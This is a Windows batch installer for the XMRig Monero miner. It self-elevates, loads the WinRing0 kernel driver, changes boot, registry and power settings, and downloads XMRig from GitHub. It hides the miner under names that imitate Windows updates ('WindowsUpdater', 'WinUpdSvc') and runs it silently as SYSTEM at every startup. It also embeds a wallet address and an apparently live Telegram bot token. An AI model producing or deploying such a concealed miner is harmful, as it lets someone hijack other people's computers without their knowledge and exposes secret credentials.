@echo off
title Monero Miner Setup – i5-14400 Optimized
color 0A
setlocal enableextensions enabledelayedexpansion

REM ───────────────────────────────────────────────────────────────────────────
REM CONFIGURATION
REM ───────────────────────────────────────────────────────────────────────────
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=WinUpdSvc"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "LOG=%DEST%\miner.log"
set "DIAG=%TEMP%\miner_diag.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

echo [*] Starting installer at %date% %time% > "%DIAG%"

REM ───────────────────────────────────────────────────────────────────────────
REM 1) ADMIN CHECK
REM ───────────────────────────────────────────────────────────────────────────
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
  echo [!] Elevating to admin… 
  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
  echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
  "%temp%\elevate.vbs"
  exit /b
)
echo [✔] Running as administrator >> "%DIAG%"

REM ───────────────────────────────────────────────────────────────────────────
REM 2) HUGE PAGES PRIVILEGE + ADDRESS SPACE
REM ───────────────────────────────────────────────────────────────────────────
echo [*] Granting “Lock pages in memory” privilege >> "%DIAG%"
set "ACCOUNT=%USERDOMAIN%\%USERNAME%"
secedit /export /cfg "%TEMP%\secpol.cfg" >nul
powershell -Command ^
  "(Get-Content '%TEMP%\secpol.cfg') -replace 'SeLockMemoryPrivilege = .*','SeLockMemoryPrivilege = %ACCOUNT%' | Set-Content '%TEMP%\secpol.cfg'"
secedit /import /cfg "%TEMP%\secpol.cfg" /db secedit.sdb /overwrite >nul
del "%TEMP%\secpol.cfg" secedit.sdb >nul 2>&1

echo [*] Raising user‐mode VA to 2800 MB (reboot required) >> "%DIAG%"
bcdedit /set increaseuserva 2800 >nul 2>&1

REM ───────────────────────────────────────────────────────────────────────────
REM 3) LARGE PAGE REGISTRY
REM ───────────────────────────────────────────────────────────────────────────
echo [*] Enabling LargePageMinimum registry key >> "%DIAG%"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" ^
    /v LargePageMinimum /t REG_DWORD /d 4294967295 /f >nul

REM ───────────────────────────────────────────────────────────────────────────
REM 4) SECURE BOOT STATUS & CPU INFO
REM ───────────────────────────────────────────────────────────────────────────
powershell -NoProfile -Command "Confirm-SecureBootUEFI" >> "%DIAG%" 2>&1

for /f "tokens=2 delims==" %%A in ('
   wmic cpu get NumberOfCores /value ^| find "="
') do set /a CORES=%%A

set /a AFFINITY=(1<<%CORES%)-1
echo [*] CPU Cores: %CORES% >> "%DIAG%"
echo [*] Affinity Mask: 0x%AFFINITY:~0,2% >> "%DIAG%" 

REM ───────────────────────────────────────────────────────────────────────────
REM 5) CLEANUP OLD SERVICE + DRIVER
REM ───────────────────────────────────────────────────────────────────────────
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1

REM ───────────────────────────────────────────────────────────────────────────
REM 6) MSR DRIVER INSTALL + VERIFY
REM ───────────────────────────────────────────────────────────────────────────
if exist "%SRC%\winring0x64.sys" (
  sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
  sc start WinRing0_1_2_0
  "%SRC%\xmrig.exe" --msr-test >nul 2>&1
  if errorlevel 1 (
    echo [!] MSR test FAILED >> "%DIAG%"
  ) else (
    echo [✔] MSR test PASSED >> "%DIAG%"
  )
)

REM ───────────────────────────────────────────────────────────────────────────
REM 7) POWER TWEAKS
REM ───────────────────────────────────────────────────────────────────────────
echo [*] Applying power & parking tweaks >> "%DIAG%"
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v CsEnabled /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul

REM ───────────────────────────────────────────────────────────────────────────
REM 8) FETCH & UNPACK LATEST XMRig
REM ───────────────────────────────────────────────────────────────────────────
echo [*] Downloading latest XMRig… >> "%DIAG%"
set "URL="
for /f "delims=" %%A in ('
  powershell -NoProfile -Command ^
  "($r=Invoke-RestMethod '%GITHUB_API%').assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1^|%{$_}.browser_download_url"
') do set "URL=%%A"

if defined URL (
  powershell -NoProfile -Command "iwr '%URL%' -OutFile '%TEMP%\xmrig.zip'"
  powershell -NoProfile -Command "Expand-Archive '%TEMP%\xmrig.zip' -Dest '%SRC%' -Force"
  del "%TEMP%\xmrig.zip"
)

REM ───────────────────────────────────────────────────────────────────────────
REM 9) DEPLOY & SCHEDULE WATCHDOG
REM ───────────────────────────────────────────────────────────────────────────
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul

:: create silent launcher & task
echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\run_silent.vbs"
echo WshShell.Run Chr(34) ^& "%DEST%\run_watchdog.bat" ^& Chr(34),0,False >> "%DEST%\run_silent.vbs"

schtasks /create /tn "%TASK_NAME%" ^
  /tr "wscript.exe \"%DEST%\run_silent.vbs\"" ^
  /sc onstart /ru SYSTEM /rl HIGHEST /f

echo [✔] Installation complete.
echo [ℹ] Reboot NOW for huge-page & VA changes to take effect.
echo [ℹ] Logs → %LOG%
echo [ℹ] Diagnostics → %DIAG%
pause
